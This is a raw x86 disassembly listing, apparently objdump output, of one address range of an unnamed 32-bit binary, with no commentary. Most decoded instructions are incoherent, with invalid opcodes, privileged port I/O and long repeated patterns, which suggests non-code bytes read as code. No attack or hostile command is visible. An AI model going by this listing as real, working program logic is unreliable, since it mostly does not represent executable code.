  414061:	repz and DWORD PTR [edi],0xac8b5d04
  414068:	or     edx,DWORD PTR [esi-0x18]
  41406b:	ror    DWORD PTR [ebx],cl
  41406d:	repz std 
  41406f:	xchg   edi,eax
  414070:	stos   BYTE PTR es:[edi],al
  414071:	(bad)  
  414072:	in     al,dx
  414073:	mov    WORD PTR [ecx],?
  414075:	(bad)  
  414076:	(bad)  
  414077:	mov    ebx,0xd7fe964
  41407c:	xor    ah,0xfd
  41407f:	jmp    0x62969dc6
  414084:	push   ecx
  414085:	dec    DWORD PTR [eax-0x76fbac00]
  41408b:	test   DWORD PTR [ecx-0xb],ebx
  41408e:	sti    
  41408f:	jmp    FWORD PTR [ecx-0x20]
  414092:	push   esp
  414093:	dec    dh
  414095:	cmc    
  414096:	push   0x0
  414098:	and    DWORD PTR [ebx],esi
  41409a:	dec    esi
  41409b:	inc    ecx
  41409c:	cdq    
  41409d:	loopne 0x414084
  41409f:	std    
	...
  4140b0:	add    BYTE PTR [eax],al
  4140b2:	mov    esi,0x13d22df5
  4140b7:	xchg   BYTE PTR [eax],bh
  4140b9:	dec    esi
  4140ba:	enter  0x880a,0x4
  4140be:	mov    eax,DWORD PTR [esi+0x7f]
  4140c1:	cli    
  4140c2:	mov    eax,ds:0x14c7ed74
  4140c7:	jo     0x4140c7
  4140c9:	dec    DWORD PTR [esi+0xb]
  4140cc:	add    BYTE PTR [eax],al
  4140ce:	pop    ecx
  4140cf:	loope  0x414125
  4140d1:	mov    DWORD PTR [ecx+0x6f748183],ecx
  4140d7:	cmc    
  4140d8:	sti    
  4140d9:	xor    DWORD PTR [ebx-0x1f],edi
  4140dc:	xor    BYTE PTR [ebx-0x1842c],cl
  4140e2:	mov    esi,0xcf7c8182
  4140e7:	hlt    
  4140e8:	sti    
  4140e9:	inc    esp
  4140eb:	jnp    0x4140eb
  4140ed:	dec    esi
  4140ef:	or     BYTE PTR [ecx-0x40b4084],0xf
  4140f6:	outs   dx,DWORD PTR ds:[esi]
  4140f7:	or     DWORD PTR [edi-0x20],edi
  4140fa:	cmp    DWORD PTR cs:[ecx-0x40b3084],0x2d34870f
  414105:	clc    
  414106:	xchg   ecx,eax
  414107:	or     al,dh
  414109:	add    ecx,DWORD PTR [ecx]
  41410b:	dec    ecx
  41410c:	inc    edx
  41410d:	adc    DWORD PTR [ebx],0x10
  414110:	jns    0x414117
  414112:	lock pop ebp
  414114:	cmp    al,BYTE PTR [eax]
	...
  414126:	add    BYTE PTR [eax],al
  414128:	gs sub al,0x53
  41412b:	push   esi
  41412c:	enter  0xfb7d,0xfd
  414130:	iret   
  414131:	pusha  
  414132:	test   al,0x78
  414134:	(bad)  
  414135:	cld    
  414136:	sti    
  414137:	add    BYTE PTR [eax-0x48],dh
  41413a:	add    DWORD PTR [ebx-0x71],esi
  41413d:	pusha  
  41413e:	mov    ebp,0xfbd4ae78
  414143:	add    BYTE PTR ds:0x70838d7c,bl
  414149:	ret    
  41414a:	sti    
  41414b:	std    
  41414c:	inc    eax
  41414d:	(bad)  
  41414e:	(bad)  
  41414f:	sti    
  414150:	(bad)  
  414151:	mov    ah,0x5b
  414153:	pop    esi
  414154:	sub    esp,DWORD PTR [edi-0x10]
  414157:	pop    ebx
  414158:	mov    dl,0xe5
  41415a:	add    DWORD PTR [ebx+0x69],edx
  41415d:	adc    BYTE PTR [eax+edx*2-0x3d],0x3b
  414162:	xchg   DWORD PTR [ebx-0x8],edx
  414165:	push   0x1a6b0c5d
  41416a:	adc    al,0x2f
  41416c:	sub    DWORD PTR [edi+0x8],esi
  41416f:	vmread DWORD PTR [ecx],ebp
  414172:	or     eax,0x12e17af8
  414177:	mov    ah,dh
  414179:	(bad)  
  41417a:	inc    edx
  41417b:	cmp    DWORD PTR [ecx],0xc3eb7df5
  414181:	scas   eax,DWORD PTR es:[edi]
  414182:	jmp    0xfb9d6c33
  414187:	das    
  414188:	inc    edx
  414189:	push   edx
  41418a:	adc    BYTE PTR [edx],bl
	...
  41419c:	add    BYTE PTR [eax],al
  41419e:	push   0xffffffe1
  4141a0:	das    
  4141a1:	xor    dh,cl
  4141a3:	jne    0x4141a6
  4141a5:	inc    edx
  4141a6:	jae    0x4141df
  4141a8:	or     al,0x7c
  4141aa:	add    dh,ch
  4141ac:	iret   
  4141ad:	mov    ch,BYTE PTR [esi+eax*1+0xb78fbfc]
  4141b4:	fld    DWORD PTR [ecx+0x71]
  4141b7:	in     eax,dx
  4141b8:	fistp  QWORD PTR [edi-0x1f]
  4141bb:	push   ecx
  4141bc:	mov    dl,0x8a
  4141be:	les    edx,FWORD PTR [ecx+ebp*1+0x10]
  4141c2:	lock push es
  4141c4:	out    0x3,eax
  4141c6:	lock push es
  4141c8:	out    0x3,eax
  4141ca:	lock push es
  4141cc:	out    0x3,eax
  4141ce:	lock push es
  4141d0:	out    0x3,eax
  4141d2:	lock push es
  4141d4:	out    0x3,eax
  4141d6:	lock push es
  4141d8:	out    0x3,eax
  4141da:	lock push es
  4141dc:	out    0x3,eax
  4141de:	lock push es
  4141e0:	out    0x3,eax
  4141e2:	lock push es
  4141e4:	out    0x3,eax
  4141e6:	lock push es
  4141e8:	out    0x3,eax
  4141ea:	lock push es
  4141ec:	out    0x3,eax
  4141ee:	lock push es
  4141f0:	out    0x3,eax
  4141f2:	lock push es
  4141f4:	out    0x3,eax
  4141f6:	lock push es
  4141f8:	out    0x3,eax
  4141fa:	lock push es
  4141fc:	out    0x3,eax
  4141fe:	lock push es
  414200:	out    0x3,eax
	...
  414212:	add    BYTE PTR [eax],al
  414214:	lock push es
  414216:	out    0x3,eax
  414218:	lock push es
  41421a:	out    0x3,eax
  41421c:	lock push es
  41421e:	out    0x3,eax
  414220:	lock push es
  414222:	out    0x3,eax
  414224:	lock push es
  414226:	out    0x3,eax
  414228:	lock push es
  41422a:	out    0x3,eax
  41422c:	lock push es
  41422e:	out    0x3,eax
  414230:	lock push es
  414232:	out    0x3,eax
  414234:	lock push es
  414236:	out    0x3,eax
  414238:	lock push es
  41423a:	add    cl,ch
  41423c:	repz push es
  41423e:	add    cl,ch
  414240:	repz push es
  414242:	add    cl,ch
  414244:	repz push es
  414246:	add    cl,ch
  414248:	repz push es
  41424a:	add    ah,ah
  41424c:	jmp    0x43c94c4e
  414251:	inc    ebx
  414252:	mov    edx,DWORD PTR [bp+di]
  414255:	jns    0x414286
  414257:	iret   
  414258:	add    esp,DWORD PTR [edx]
  41425a:	and    cl,cl
  41425c:	push   cs
  41425d:	daa    
  41425e:	and    BYTE PTR [ebp+0x4b],dh
  414261:	data16 and BYTE PTR [edx+0x19],bl
  414265:	push   edx
  414266:	ins    BYTE PTR es:[edi],dx
  414267:	dec    ebp
  414268:	adc    DWORD PTR [ebp+0x20],esi
  41426b:	pop    ebp
  41426c:	or     al,0x66
  41426e:	and    BYTE PTR [ebx+0x11],cl
  414271:	jnp    0x4142e7
  414273:	dec    esp
  414274:	push   es
  414275:	daa    
  414276:	cmp    dl,BYTE PTR [eax]
	...
  414288:	add    BYTE PTR [eax],al
  41428a:	stc    
  41428b:	cld    
  41428c:	inc    eax
  41428d:	inc    esi
  41428e:	add    al,0x7a
  414290:	jb     0x4142d2
  414292:	adc    ebx,DWORD PTR [edi+0x74]
  414295:	leave  
  414296:	sbb    ebp,DWORD PTR [eax+0x27]
  414299:	leave  
  41429a:	sbb    al,0x3a
  41429c:	aaa    
  41429d:	ror    DWORD PTR [eax],1
  41429f:	xor    eax,0x2714d930
  4142a4:	bound  eax,QWORD PTR [eax]
  4142a6:	adc    al,0x3d
  4142a8:	ins    DWORD PTR es:[edi],dx
  4142a9:	add    al,0xbe
  4142ab:	imul   esp,DWORD PTR [ebx+0x7],0x14
  4142af:	dec    edx
  4142b0:	(bad)  
  4142b1:	cli    
  4142b2:	shl    BYTE PTR [eax+0x2c],1
  4142b5:	or     DWORD PTR [ebp-0x41f6939e],esi
  4142bb:	imul   esp,DWORD PTR [ebp-0x3f],0xbb20778f
  4142c2:	nop
  4142c3:	ja     0x414328
  4142c5:	add    BYTE PTR [ebx+0x77],cl
  4142c8:	popa   
  4142c9:	fs idiv edi
  4142cc:	or     DWORD PTR ds:0x726b3e13,ecx
  4142d2:	sub    al,0x25
  4142d4:	outs   dx,BYTE PTR gs:[esi]
  4142d6:	jg     0x414335
  4142d8:	jb     0x414347
  4142da:	js     0x41433c
  4142dc:	outs   dx,DWORD PTR gs:[esi]
  4142de:	ja     0x414312
  4142e0:	and    BYTE PTR [eax+0x7d],ch
  4142e3:	pusha  
  4142e4:	jo     0x414320
  4142e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142e7:	sbb    eax,0x1e3e7773
  4142ec:	bound  eax,QWORD PTR gs:[eax]
	...
  4142ff:	add    BYTE PTR [edx],bh
  414301:	outs   dx,BYTE PTR ds:[si]
  414303:	jae    0x41433b
  414305:	data16 je 0x41437f
  414308:	cmp    BYTE PTR [ecx+0x61],bh
  41430b:	cmp    bl,BYTE PTR cs:[ecx+ebp*2+0x2f]
  414310:	xchg   esp,eax
  414311:	add    cl,BYTE PTR [ecx]
  414313:	or     cl,BYTE PTR [ecx-0x66fffffc]
  414319:	add    al,0x0
  41431b:	add    BYTE PTR [ecx-0x76fffffc],bl
  414321:	add    al,0x0
  414323:	add    BYTE PTR [ecx+0x59000004],cl
  414329:	add    al,0x0
  41432b:	add    BYTE PTR [ecx+0x4],bl
  41432e:	add    BYTE PTR [eax],al
  414330:	dec    ecx
  414331:	add    al,0x0
  414333:	add    BYTE PTR [ecx+0x4],cl
  414336:	add    BYTE PTR [eax],al
  414338:	pop    ecx
  414339:	add    al,0x0
  41433b:	add    BYTE PTR [ecx+0x4],bl
  41433e:	add    BYTE PTR [eax],al
  414340:	dec    ecx
  414341:	add    al,0x0
  414343:	add    BYTE PTR [ecx+0x4],cl
  414346:	add    BYTE PTR [eax],al
  414348:	sbb    DWORD PTR [eax+eax*1],eax
  41434b:	add    BYTE PTR [ecx],bl
  41434d:	add    al,0x0
  41434f:	add    al,dh
  414351:	call   0x2b20:0x1e8b4eb2
  414358:	hlt    
  414359:	das    
  41435a:	iret   
  41435b:	push   esp
  41435c:	adc    al,0x13
  41435e:	mov    ds:0x80c8cd62,eax
  414363:	or     DWORD PTR [eax],eax
	...
  414375:	add    BYTE PTR [edi+0x1080bf2],bl
  41437b:	mov    ds:0xb5cc680a,al
  414380:	jnp    0x4143d3
  414382:	outs   dx,BYTE PTR ds:[esi]
  414383:	fld    QWORD PTR [ecx]
  414385:	add    al,dh
  414387:	fld    QWORD PTR [ecx]
  414389:	add    al,dh
  41438b:	fld    QWORD PTR [ecx]
  41438d:	add    al,dh
  41438f:	fld    QWORD PTR [ecx]
  414391:	add    al,dh
  414393:	fld    QWORD PTR [ecx]
  414395:	add    al,dh
  414397:	fld    QWORD PTR [ecx]
  414399:	add    al,dh
  41439b:	fld    QWORD PTR [ecx]
  41439d:	add    al,dh
  41439f:	fld    QWORD PTR [ecx]
  4143a1:	add    al,dh
  4143a3:	fld    QWORD PTR [ecx]
  4143a5:	add    al,dh
  4143a7:	fld    QWORD PTR [ecx]
  4143a9:	add    al,dh
  4143ab:	fld    QWORD PTR [ecx]
  4143ad:	add    al,dh
  4143af:	fld    QWORD PTR [ecx]
  4143b1:	add    al,dh
  4143b3:	fld    QWORD PTR [ecx]
  4143b5:	add    al,dh
  4143b7:	fld    QWORD PTR [ecx]
  4143b9:	add    al,dh
  4143bb:	fld    QWORD PTR [ecx]
  4143bd:	add    al,dh
  4143bf:	fld    QWORD PTR [ecx]
  4143c1:	add    al,dh
  4143c3:	fld    QWORD PTR [ecx]
  4143c5:	add    al,dh
  4143c7:	fld    QWORD PTR [ecx]
  4143c9:	add    al,dh
  4143cb:	fld    QWORD PTR [ecx]
  4143cd:	add    al,dh
  4143cf:	fld    QWORD PTR [ecx]
  4143d1:	add    al,dh
  4143d3:	fld    QWORD PTR [ecx]
  4143d5:	add    al,dh
  4143d7:	fld    QWORD PTR [ecx]
	...
  4143e9:	add    BYTE PTR [eax],al
  4143eb:	add    al,dh
  4143ed:	push   es
  4143ee:	out    0x3,eax
  4143f0:	lock push es
  4143f2:	out    0x3,eax
  4143f4:	lock push es
  4143f6:	out    0x3,eax
  4143f8:	lock push es
  4143fa:	out    0x3,eax
  4143fc:	lock push es
  4143fe:	out    0x3,eax
  414400:	lock push es
  414402:	out    0x3,eax
  414404:	lock push es
  414406:	out    0x3,eax
  414408:	lock push es
  41440a:	out    0x3,eax
  41440c:	lock push es
  41440e:	out    0x3,eax
  414410:	lock push es
  414412:	out    0x3,eax
  414414:	lock push es
  414416:	out    0x3,eax
  414418:	lock push es
  41441a:	out    0x3,eax
  41441c:	lock push es
  41441e:	out    0x3,eax
  414420:	lock push es
  414422:	out    0x3,eax
  414424:	lock push es
  414426:	out    0x3,eax
  414428:	lock push es
  41442a:	out    0x3,eax
  41442c:	lock push es
  41442e:	out    0x3,eax
  414430:	lock push es
  414432:	out    0x3,eax
  414434:	lock push es
  414436:	out    0x3,eax
  414438:	lock push es
  41443a:	out    0x3,eax
  41443c:	lock push es
  41443e:	out    0x3,eax
  414440:	lock push es
  414442:	out    0x3,eax
  414444:	lock push es
  414446:	out    0x3,eax
  414448:	lock push es
  41444a:	out    0x3,eax
  41444c:	lock push es
  41444e:	out    0x3,eax
	...
  414460:	add    BYTE PTR [eax],al
  414462:	lock push es
  414464:	out    0x3,eax
  414466:	lock push es
  414468:	out    0x3,eax
  41446a:	lock push es
  41446c:	out    0x3,eax
  41446e:	lock push es
  414470:	out    0x3,eax
  414472:	lock push es
  414474:	out    0x3,eax
  414476:	lock push es
  414478:	add    cl,ch
  41447a:	repz push es
  41447c:	add    cl,ch
  41447e:	repz push es
  414480:	add    cl,ch
  414482:	repz push es
  414484:	add    cl,ch
  414486:	repz push es
  414488:	add    cl,ch
  41448a:	repz push es
  41448c:	add    cl,ch
  41448e:	repz push es
  414490:	add    cl,ch
  414492:	repz push es
  414494:	add    cl,ch
  414496:	repz push es
  414498:	add    cl,ch
  41449a:	repz push es
  41449c:	add    cl,ch
  41449e:	repz push es
  4144a0:	add    cl,ch
  4144a2:	repz push es
  4144a4:	add    cl,ch
  4144a6:	repz push es
  4144a8:	add    al,bl
  4144aa:	sbb    eax,0x1d43438
  4144af:	pop    es
  4144b0:	jo     0x41443a
  4144b2:	cmp    al,0x78
  4144b4:	jne    0x414444
  4144b6:	inc    ebp
  4144b7:	arpl   WORD PTR [eax],ax
  4144b9:	jns    0x414506
  4144bb:	ja     0x41451f
  4144bd:	mov    esi,ebx
  4144bf:	pop    ebp
  4144c0:	jne    0x41450e
  4144c2:	and    dh,BYTE PTR [ebx+0x77]
  4144c5:	jmp    0x4144ca
	...
  4144d6:	add    BYTE PTR [eax],al
  4144d8:	in     al,0x38
  4144da:	xor    DWORD PTR ds:0x446a06e1,ebx
  4144e0:	add    edi,DWORD PTR [edx+0x71]
  4144e3:	jmp    0xf5727da4
  4144e8:	shl    BYTE PTR [esi*1+0x321df3f1],0xfa
  4144f0:	pop    ds
  4144f1:	pop    es
  4144f2:	pop    edi
  4144f3:	or     edx,ebx
  4144f5:	sbb    eax,0x5af3da32
  4144fa:	arpl   WORD PTR ds:0xff6769c9,bx
  414500:	repz jb 0x414566
  414503:	add    BYTE PTR [edx+0x5d],cl
  414506:	add    BYTE PTR [esi+ebp*8+0x5c],ch
  41450a:	popa   
  41450b:	add    BYTE PTR [eax+0x37],bh
  41450e:	das    
  41450f:	add    BYTE PTR [ecx],ch
  414511:	bound  ebp,QWORD PTR [edi+0x73]
  414514:	inc    esi
  414515:	fs jb  0x41457c
  414518:	clc    
  414519:	add    ch,BYTE PTR [eax+0x65]
  41451c:	sub    eax,0x4c006b65
  414521:	outs   dx,BYTE PTR fs:[esi]
  414523:	imul   esi,DWORD PTR [edx+ebp*2],0x0
  414527:	cmp    esp,DWORD PTR fs:[edx+0x63]
  41452b:	outs   dx,DWORD PTR ds:[esi]
  41452c:	das    
  41452d:	or     DWORD PTR [edx+esi*2-0x5c],esi
  414531:	jns    0x4145a7
  414533:	outs   dx,BYTE PTR ds:[esi]
  414534:	jle    0x414569
  414536:	add    BYTE PTR [ecx],dh
  414538:	mov    eax,0x312d33
	...
  41454d:	add    BYTE PTR [eax+0x4e6c6508],bh
  414553:	pop    edx
  414554:	popa   
  414555:	jns    0x4145b5
  414557:	ja     0x414559
  414559:	xor    DWORD PTR [ebx+0x39],edi
  41455c:	xor    al,0x35
  41455e:	ja     0x41457d
  414560:	add    BYTE PTR [ebx+0x71],dh
  414563:	arpl   WORD PTR [edi+ebp*2+0x46],sp
  414567:	add    ebp,DWORD PTR ds:0x3136fa32
  41456d:	imul   BYTE PTR ss:[edx]
  414570:	xor    eax,0x725b3a00
  414575:	imul   ecx,edx,0xc4730076
  41457b:	outs   dx,DWORD PTR fs:[esi]
  41457d:	push   0x616530
  414582:	sub    al,0x62
  414584:	outs   dx,DWORD PTR ds:[esi]
  414585:	je     0x41457b
  414587:	js     0x414589
  414589:	arpl   si,bp
  41458b:	pop    ebp
  41458c:	jo     0x414603
  41458e:	lock or DWORD PTR [edi+0x72],ebx
  414592:	lock or eax,0xd66772
  414598:	pop    edi
  414599:	jno    0x41455e
  41459b:	(bad)  [ebp+0x67]
  41459e:	iret   
  41459f:	cld    
  4145a0:	pop    esi
  4145a1:	jb     0x414593
  4145a3:	add    esp,DWORD PTR [ebp+0x6d]
  4145a6:	pushf  
  4145a7:	mov    edi,0xdd8c6c64
  4145ac:	outs   dx,BYTE PTR fs:[esi]
  4145ae:	(bad)  
  4145af:	mov    edx,0x65
	...
  4145c4:	call   0x1ee:0x837372c2
  4145cb:	das    
  4145cc:	ret    0x34f0
  4145cf:	xor    al,bl
  4145d1:	(bad)  [esi+0x68]
  4145d4:	push   ecx
  4145d5:	mov    dl,0x60
  4145d7:	jbe    0x414626
  4145d9:	nop
  4145da:	add    DWORD PTR [esi+0x62],esp
  4145dd:	and    DWORD PTR [eax+0x64],0x47
  4145e1:	add    DWORD PTR [ecx],0x69
  4145e4:	pop    ecx
  4145e5:	push   0x65
  4145e7:	arpl   WORD PTR [edx-0x22],ax
  4145ea:	fs jno 0x414641
  4145ed:	test   BYTE PTR [ecx],al
  4145ef:	jno    0x414638
  4145f1:	and    DWORD PTR [edx+0x63],0x7372de22
  4145f8:	and    BYTE PTR [ebx],bh
  4145fa:	jb     0x414667
  4145fc:	adc    DWORD PTR [esp+eax*1],edi
  4145ff:	imul   ecx,DWORD PTR [ecx],0x41
  414602:	ins    BYTE PTR es:[edi],dx
  414603:	pop    edi
  414604:	adc    eax,0x1861042a
  414609:	cmp    ebx,DWORD PTR [ebp+0x71]
  41460c:	adc    eax,0xfc6e6ade
  414611:	cmp    dh,BYTE PTR [edx+0x6e]
  414614:	aad    0x31
  414616:	add    al,0x6a
  414618:	xlat   BYTE PTR ds:[ebx]
  414619:	push   es
  41461a:	sbb    ch,BYTE PTR [ebx+eiz*8+0x65]
  41461e:	out    0x5d,eax
  414620:	jecxz  0x414689
  414622:	add    bh,BYTE PTR [ebx-0x23]
  414625:	jno    0x41460e
  414627:	popa   
	...
  414638:	add    BYTE PTR [eax],al
  41463a:	aam    0x61
  41463c:	cli    
  41463d:	jo     0x414612
  41463f:	(bad)  
  414640:	out    0x61,eax
  414642:	xchg   edi,eax
  414643:	ja     0x414651
  414645:	(bad)  
  414646:	iret   
  414647:	pop    edx
  414648:	sti    
  414649:	add    esp,DWORD PTR [ecx-0x5a8e378e]
  41464f:	fnstenv gs:[eax-0x10]
  414653:	ss pop ss
  414655:	xor    al,0xc0
  414657:	ss pop ss
  414659:	add    al,0x80
  41465b:	jno    0x414616
  41465d:	jae    0x4145eb
  41465f:	popa   
  414660:	out    0x69,eax
  414662:	test   DWORD PTR [eax-0x35],edi
  414665:	bound  ebx,QWORD PTR [esi+0x7]
  414668:	lds    esp,FWORD PTR [edx+0x4f]
  41466b:	jae    0x4145fc
  41466d:	add    esp,DWORD PTR [ecx+0x74]
  414670:	mov    WORD PTR [esi+0x53],fs
  414673:	jne    0x41465c
  414675:	bound  eax,QWORD PTR [ecx+0x5f]
  414678:	jnp    0x4146d8
  41467a:	aas    
  41467b:	pop    es
  41467c:	mov    DWORD PTR [esi+0x41],ebp
  41467f:	jae    0x414605
  414681:	jno    0x414673
  414683:	pop    esi
  414684:	mov    WORD PTR [edx+0x26],fs
  414687:	fs jge 0x41468d
  41468a:	and    BYTE PTR [edi+edx*2+0x74],ah
  41468e:	adc    esi,DWORD PTR [ebp-0x19]
  414691:	sub    al,0xdd
  414693:	xor    DWORD PTR [esi],ebx
  414695:	sub    eax,0x6be731c5
  41469a:	add    ebx,DWORD PTR [ecx+0x3b]
  41469d:	pop    edi
	...
  4146ae:	add    BYTE PTR [eax],al
  4146b0:	add    al,BYTE PTR [edi]
  4146b2:	dec    ebx
  4146b3:	gs (bad) 
  4146b5:	arpl   WORD PTR [eax],ax
  4146b7:	inc    ebp
  4146b8:	jmp    0x4146c0
  4146ba:	pop    edi
  4146bb:	aas    
  4146bc:	shl    BYTE PTR [ebx+eiz*2+0x1e],1
  4146c0:	hlt    
  4146c1:	jb     0x41472b
  4146c3:	push   cs
  4146c4:	iret   
  4146c5:	dec    ecx
  4146c6:	jno    0x4146b1
  4146c8:	rcr    BYTE PTR [eax+0x65],cl
  4146cb:	add    al,0xd8
  4146cd:	ja     0x4146cf
  4146cf:	or     cl,ah
  4146d1:	dec    ecx
  4146d2:	jb     0x4146e1
  4146d4:	retf   
  4146d5:	add    BYTE PTR gs:0x4675893,cl
  4146dc:	cwde   
  4146dd:	push   es
  4146de:	das    
  4146df:	sbb    bl,ah
  4146e1:	sbb    DWORD PTR [eax],eax
  4146e3:	shl    DWORD PTR [esi-0x523f91a8],cl
  4146e9:	gs jb  0x4146d5
  4146ec:	and    BYTE PTR [ecx+0x6e],0xce
  4146f0:	xchg   edi,eax
  4146f1:	gs add cl,dl
  4146f4:	xchg   edx,eax
  4146f5:	pop    eax
  4146f6:	outs   dx,BYTE PTR ds:[esi]
  4146f7:	enter  0x75b,0x6f
  4146fb:	enter  0x7469,0x71
  4146ff:	mov    eax,ds:0x995f5ef3
  414704:	arpl   WORD PTR [edx+0x0],si
  414707:	test   BYTE PTR [edx+0x73],dl
  41470a:	jb     0x41468c
  41470c:	dec    ebx
  41470d:	pop    es
  41470e:	jo     0x414698
  414710:	inc    eax
  414711:	js     0x414713
  414713:	mov    BYTE PTR [eax],al
	...
  414725:	add    BYTE PTR [edx+0x4a],dl
  414728:	pop    edi
  414729:	mov    BYTE PTR [edx],dl
  41472b:	pop    es
  41472c:	ss mov ah,0xd7
  41472f:	aaa    
  414730:	xor    bl,BYTE PTR [eax]
  414732:	hlt    
  414733:	dec    ecx
  414734:	imul   ecx,DWORD PTR [eax+0x12],0x63
  414738:	pop    edi
  414739:	jmp    0x41b5a34f
  41473e:	and    eax,0x89006559
  414743:	pop    esp
  414744:	outs   dx,BYTE PTR gs:[esi]
  414746:	cs pusha 
  414748:	jb     0x41474a
  41474a:	mov    ah,0x65
  41474c:	je     0x4147b6
  41474e:	lods   al,BYTE PTR ds:[esi]
  41474f:	jo     0x414751
  414751:	jae    0x41475a
  414753:	imul   si,WORD PTR [eax+0x10],0x3
  414758:	push   0x65
  41475a:	jmp    0x7302:0xf8636571
  414761:	gs in  eax,0x61
  414764:	imul   ebp,DWORD PTR [ebp-0x14],0x2
  414768:	jo     0x4147d9
  41476a:	repnz pop edi
  41476c:	imul   ebp,DWORD PTR [edi+0x27],0x466c6505
  414773:	outs   dx,DWORD PTR ds:[esi]
  414774:	popa   
  414775:	jns    0x41479d
  414777:	outs   dx,BYTE PTR ds:[esi]
  414778:	sub    eax,0x2d33e800
  41477d:	xor    eax,ebp
  41477f:	add    ch,BYTE PTR [ecx+0x75]
  414782:	cmp    dh,BYTE PTR [ecx+0x5d]
  414785:	outs   dx,BYTE PTR ds:[esi]
  414786:	cs add eax,0x6568
	...
  41479c:	mov    ch,0x74
  41479e:	imul   esp,DWORD PTR [ebp-0x27],0x7d73714a
  4147a5:	dec    ebx
  4147a6:	outs   dx,BYTE PTR ds:[esi]
  4147a7:	add    BYTE PTR [ebx+0x706d6f63],al
  4147ad:	popaw  
  4147af:	add    BYTE PTR [esi+0x72],al
  4147b2:	pop    ebp
  4147b3:	outs   dx,BYTE PTR ds:[esi]
  4147b4:	outs   dx,BYTE PTR ds:[esi]
  4147b5:	pop    edi
  4147b6:	add    BYTE PTR [esp+ebp*2+0x71],dh
  4147ba:	je     0x414825
  4147bc:	ja     0x41481b
  4147be:	add    BYTE PTR [ecx+0x29],ah
  4147c1:	je     0x41482f
  4147c3:	mov    DWORD PTR gs:[edi+0x65],esp
  4147c7:	arpl   WORD PTR [ecx+0x5e],ax
  4147ca:	ins    BYTE PTR es:[edi],dx
  4147cb:	ins    BYTE PTR es:[edi],dx
  4147cc:	lock cmp al,BYTE PTR [eax+esi*2]
  4147d0:	or     eax,0xf063653f
  4147d5:	sub    al,0x67
  4147d7:	popa   
  4147d8:	add    al,BYTE PTR [ebx+0x78]
  4147db:	add    BYTE PTR [ecx],ah
  4147dd:	fisubr WORD PTR [edx+0x72]
  4147e0:	sar    DWORD PTR [edi+eiz*2],1
  4147e3:	add    bh,ah
  4147e5:	push   ss
  4147e6:	pusha  
  4147e7:	ins    BYTE PTR es:[edi],dx
  4147e8:	leave  
  4147e9:	(bad)  
  4147ea:	pop    esi
  4147eb:	add    cl,bl
  4147ed:	add    DWORD PTR [ecx+0x76],esp
  4147f0:	int    0x16
  4147f2:	popa   
  4147f3:	jae    0x4147f7
  4147f5:	ficomp WORD PTR [edi+0x67]
  4147f8:	sar    eax,cl
  4147fa:	pop    edi
  4147fb:	arpl   ax,si
  4147fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147fe:	aaa    
  4147ff:	add    BYTE PTR ss:[eax],al
	...
  414812:	fisubr WORD PTR [edi-0x3572ffc9]
  414818:	mov    WORD PTR [bx+0x6501],si
  41481e:	xchg   ecx,eax
  41481f:	leave  
  414820:	push   0x1d69175
  414825:	test   WORD PTR [esi+ebx*2+0x34b28777],di
  41482d:	add    BYTE PTR [ecx-0x53],dl
  414830:	jbe    0x41489a
  414832:	push   edi
  414833:	stos   BYTE PTR es:[edi],al
  414834:	push   0x597f4800
  414839:	pop    edi
  41483a:	dec    eax
  41483b:	jg     0x41483e
  41483d:	jo     0x41489e
  41483f:	xor    DWORD PTR [ecx+0x0],0x71686a52
  414846:	inc    ebx
  414847:	xchg   edi,eax
  414848:	pop    edi
  414849:	gs lock jnp 0x4148aa
  41484d:	pop    edi
  41484e:	sbb    BYTE PTR [ebp+ebx*2+0x5f],bh
  414852:	sbb    dh,bl
  414854:	pusha  
  414855:	ja     0x41487a
  414857:	pop    es
  414858:	push   edi
  414859:	arpl   WORD PTR [ecx],dx
  41485b:	bound  ebx,QWORD PTR [eax]
  41485d:	add    al,0x1b
  41485f:	pop    bx
  414861:	js     0x41487b
  414863:	bound  edx,QWORD PTR [esi+0x4]
  414866:	adc    DWORD PTR [esi+0x55],esp
  414869:	arpl   WORD PTR [esi+eiz*2],cx
  41486c:	out    0x74,eax
  41486e:	xlat   BYTE PTR ds:[ebx]
  41486f:	pop    edx
  414870:	cmp    eax,0x3906e267
  414875:	popa   
	...
  414886:	add    BYTE PTR [eax],al
  414888:	shl    BYTE PTR [ecx+0x19],cl
  41488b:	js     0x41487d
  41488d:	pusha  
  41488e:	push   cs
  41488f:	jbe    0x414864
  414891:	jo     0x41489f
  414893:	jbe    0x414885
  414895:	sbb    ch,BYTE PTR gs:[eax-0x2a]
  414899:	pop    edi
  41489a:	(bad)  
  41489c:	ret    0xa65
  41489f:	pop    esp
  4148a0:	xchg   ebx,eax
  4148a1:	pop    edx
  4148a2:	out    0x75,eax
  4148a4:	(bad)  
  4148a5:	pop    ebp
  4148a6:	std    
  4148a7:	lea    ebp,gs:[edi-0x19]
  4148ab:	push   0x62d35da3
  4148b0:	add    BYTE PTR [esi],0xd7
  4148b3:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4148b5:	pop    eax
  4148b6:	aam    0x77
  4148b8:	lock fs enter 0x8b77,0x65
  4148be:	int    0x3
  4148c0:	push   ecx
  4148c1:	jbe    0x414889
  4148c3:	pop    esp
  4148c4:	dec    edi
  4148c5:	ins    BYTE PTR es:[edi],dx
  4148c6:	out    0x65,eax
  4148c8:	aas    
  4148c9:	jo     0x41485e
  4148cb:	pop    di
  4148cd:	pop    es
  4148ce:	call   0x1775:0x8c6a5160
  4148d5:	pop    es
  4148d6:	jl     0x414932
  4148d8:	push   ecx
  4148d9:	jb     0x414867
  4148db:	push   0xfffffff0
  4148dd:	push   0x74137790
  4148e2:	add    BYTE PTR [ebx+esi*8+0x3f7d636e],cl
  4148e9:	je     0x41491a
  4148eb:	jmp    0x4148f0
	...
  4148fc:	add    BYTE PTR [eax],al
  4148fe:	push   cs
  4148ff:	jb     0x414968
  414901:	dec    edi
  414902:	pop    ss
  414903:	jb     0x414905
  414905:	dec    ebp
  414906:	adc    esi,DWORD PTR [eax+0x6d]
  414909:	push   ebp
  41490a:	adc    eax,DWORD PTR [edi]
  41490c:	jno    0x414956
  41490e:	pop    ss
  41490f:	inc    esi
  414910:	outs   dx,BYTE PTR ds:[esi]
  414911:	xor    eax,0x4a0045cc
  414916:	shl    DWORD PTR [ecx+0x70],1
  414919:	dec    eax
  41491a:	jecxz  0x414922
  41491c:	fs adc bl,dl
  41491f:	jno    0x41498e
  414921:	psubusb mm0,QWORD PTR [esi]
  414924:	je     0x41492e
  414926:	(bad)  [edx+0x6d]
